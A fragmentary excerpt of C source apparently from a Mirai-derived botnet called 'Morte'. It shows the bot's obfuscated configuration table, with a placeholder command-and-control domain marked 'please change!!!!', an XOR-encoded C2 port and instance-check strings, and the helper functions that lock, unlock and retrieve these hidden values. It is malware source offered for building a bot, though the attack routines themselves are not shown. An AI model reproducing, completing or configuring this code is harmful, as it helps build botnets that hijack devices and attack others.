...
{
    add_entry(TABLE_CNC_DOMAIN, "Urencryptdomain", length); // please change!!!!
    add_entry(TABLE_CNC_PORT, "\x0D\x7B", 2);
    add_entry(TABLE_VERSION, "\x11\x22", 2);
    add_entry(TABLE_INSTANCE_EXISTS, "\x60\x50\x57\x4A\x02\x55\x4A\x5B\x02\x43\x45\x43\x4B\x4C\x22", 15);
...
void table_unlock_val(uint8_t id)
{
    ...
    if (!val->locked)
    {
        printf("[Morte_table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif
...
void table_lock_val(uint8_t id)
{
    ...
    if (val->locked)
    {
        printf("[Morte_table] Tried to double-lock value\n");
        return;
    }
#endif
...
char *table_retrieve_val(int id, int *len)
{
    ...
    if (val->locked)
    {
        printf("[Morte_table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif
